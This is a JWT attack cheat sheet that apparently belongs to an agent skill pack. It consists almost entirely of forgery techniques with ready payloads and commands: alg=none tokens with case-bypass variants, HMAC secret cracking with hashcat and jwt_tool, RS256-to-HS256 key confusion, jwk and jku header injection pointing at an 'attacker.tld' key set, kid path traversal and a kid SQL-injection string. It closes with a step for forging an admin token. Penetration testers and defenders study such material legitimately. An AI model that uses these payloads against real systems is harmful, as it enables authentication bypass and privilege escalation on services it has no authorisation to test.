# JWT attack cheat sheet

Companion to `SKILL.md`. Decode first (`jwt.io` or `hashcat`), then walk every attack — don't stop
at "it's signed". Tamper a claim (e.g. `role:admin`, `sub`) and try each forgery path.

## Recon the token
```
header.payload.signature  → base64url-decode header + payload
note: alg (HS*/RS*/ES*/none), kid, jku/jwk/x5u, typ, and the claims (sub, role, exp, aud, iss)
```

## alg=none (server trusts the header)
```
header {"alg":"none","typ":"JWT"}   payload {...tampered...}   signature = "" (empty)
try: none, None, NONE, nOnE   (case bypass of a naive blacklist)
final token: base64url(header) + "." + base64url(payload) + "."
```

## HS256 secret brute / known key
```
hashcat -m 16500 token.txt wordlist.txt          # crack a weak HMAC secret
john --format=HMAC-SHA256 ...
# common weak secrets: "secret","changeme", framework defaults, leaked keys from repos (recon-github-code-leaks)
# once cracked: re-sign the tampered payload with the secret
```

## RS256 → HS256 algorithm confusion (server uses the RSA *public* key as HMAC key)
```
1. obtain the server's RSA public key (JWKS at /.well-known/jwks.json, /jwks, TLS cert, or derive from 2 tokens)
2. forge: set header alg=HS256, sign(payload, HMAC key = public-key PEM bytes)
# jwt_tool -X k -pk public.pem   (algorithm confusion mode)
```

## Header-injection key sources (make the server trust YOUR key)
```
jwk   embed your public key in the header:  {"alg":"RS256","jwk":{...your key...}}  then sign with your priv key
jku   point to your JWKS:  {"jku":"https://attacker.tld/jwks.json"}  (test SSRF allowlist bypass on the URL)
kid   {"kid":"../../dev/null"} + empty/known key  |  kid SQLi: {"kid":"x' UNION SELECT 'secret'-- -"}
      kid path traversal to a predictable file whose contents you control (e.g. sign with "AAAA")
x5u/x5c  attacker-controlled cert chain
```

## Claim / logic abuse
```
none of the above needed if: signature not verified at all (send garbage sig), exp not checked
  (replay expired), aud/iss not validated (cross-service token reuse), or 'sub'/'role' trusted verbatim.
kid/jku SSRF → reach internal services.  Nested JWT (jwe/jws) confusion.  Weak "typ" handling.
```

## Tooling
```
jwt_tool <token>                 # scans for common flaws
jwt_tool <token> -T              # tamper mode (edit claims interactively)
jwt_tool <token> -X a            # alg:none
jwt_tool <token> -C -d wl.txt    # crack HMAC
jwt_tool <token> -X k -pk pub.pem# RS→HS confusion
```

## Verify
Forge a token asserting a privilege you don't have (e.g. `role:admin` / another `sub`) and show the
server accepts it (an admin-only response). Use test accounts; don't touch other users' real data.

## References
PortSwigger JWT labs; jwt_tool; Auth0 "Critical JWT vulnerabilities"; RFC 7519/7515.
